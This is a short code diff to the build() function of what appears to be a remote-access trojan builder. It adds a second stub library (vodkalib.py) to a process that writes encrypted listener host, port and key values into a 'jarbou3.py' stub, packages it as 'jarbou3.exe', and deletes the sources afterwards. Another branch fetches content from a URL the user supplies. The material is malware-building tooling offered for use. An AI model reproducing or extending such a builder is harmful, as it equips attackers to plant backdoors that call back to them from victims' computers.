@@ -105,9 +105,12 @@ def build():
             icon = input('enter your icon path:')
         if platform.system() == "Windows":
             os.system('powershell -c cd stub; cp jarbou3.py ..')
+            os.system('powershell -c cd stub; cp vodkalib.py ..')
+
         else:
 
             os.system("cp -r stub/jarbou3.py "+current)
+            os.system("cp -r stub/vodkalib.py "+current)
         replace_string('jarbou3.py', '$lhost', str(cryptedhost))
         replace_string('jarbou3.py', '$lport', str(cryptedport))
         replace_string("jarbou3.py", "$hostkey", str(keyhost))
@@ -125,9 +128,11 @@ def build():
         if platform.system() == "Windows":
             os.system('powershell -c cd dist; cp jarbou3.exe ..')
             os.remove('jarbou3.py')
+            os.remove('vodkalib.py')
         else:
             os.system("cd dist && mv jarbou3.exe ..")
             os.remove("jarbou3.py")
+            os.remove("vodkalib.py")
     elif c == 2:
         URL = input('enter you url:')
         u = requests.get(URL).text
